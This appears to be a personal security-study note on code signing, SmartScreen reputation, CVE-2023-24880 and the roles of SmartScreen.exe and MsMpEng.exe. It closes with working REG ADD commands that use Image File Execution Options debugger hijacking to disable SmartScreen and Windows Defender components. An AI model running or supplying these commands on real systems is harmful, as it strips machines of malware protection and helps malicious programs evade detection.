# Code Signing Certificate

With the digital signature process of executable files and scripts introduced by MS, these certificates prove that the files are safe.
SmartScreen filter manages its own white list database of certificates to determine if the certificate is secure or note.
judge If the certificate does not exist or if the certificate is invalid because the file has been tampered with, a warning is displayed when running. 
Notify Users.<br>

In order to bypass web browser file downloads, antivirus, and Windows Defender Smart Screen, the program needs to be signed.
This is done by purchasing a certificate from a company, signing the program with a private key, and granting the certificate. Even if a certificate is granted, Smart Screen will continue to occur until the certificate has acquired a reputation for being secure.<br>

1. Signed program distribution -> (Smart Screen occurs) -> Program report X -> Reputation improvement of the signature -> Smart Screen does no occur<br>

<strong>more imformation : https://twoicefish-secu.tistory.com/411</strong>


CVE-2023-24880 (CVSS score: 5.4), is a security feature bypass found in Windows SmartScreen, which allows to create executables that can bypass Windows Mark of the Web (MotW) security warnings. Although it has a CVSS score of 5.4, it is under active exploitation


# MsMpeng.exe Difference SmartSreen.exe

<strong>MsMpenge.exe</strong> : one of the main components of Windows Defender, which is used to scan your computer in real time and detect malware.<br>
<strong>SmartScreen.exe</strong> : Protects the computer from malicious code or threats by checking the safety of files or executable files downloaded by the user.<br>

<h3>Difference</h3>
<p>1. To do :</p>
-Smartscreen.exe is primarily responsible for evaluating the reliability of downloaded files and blocking malicious code.<br>
-MsMpenge.exe is reponsible for Windows Defender's core role of detecting and blocking malware. MsMpenge.exe scans your computer's files and system health to identify and remove malicious code.<br>
<br>
<p>2. Scope of role :</p>
-SmartScreen.exe is primarily focused on evaluating the reliability of files downloaded from the Internet.<br>
-MsMpenge.exe protects your entire system, detects malware, and provides real-time protection for files, folder, executables, and more.<br>

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/607f800e-d432-445b-bb68-98deca7b6293)

If the executable is added to the regedit path("HKLM\Software\Microsoft\Windows NT\CUrrentVersion\Image File Execution Options\") and the debugger flag is set, other programs amy run before that program runs.
If the program that runs first does not call that program, you can substitute that program. This can prevent various important programs from running.

<h3>If you want to block "smartscreen"</h3>
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smartscreen.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>

<h3>If you want to block "Windows Defender"</h3>
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\securityhealthhost.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secHealthUI.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\werFault.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"<br>

![image](https://github.com/Kwhitebear/Security_study/assets/99308681/03c52498-451b-4df5-9222-526db34b7964)

Run system32
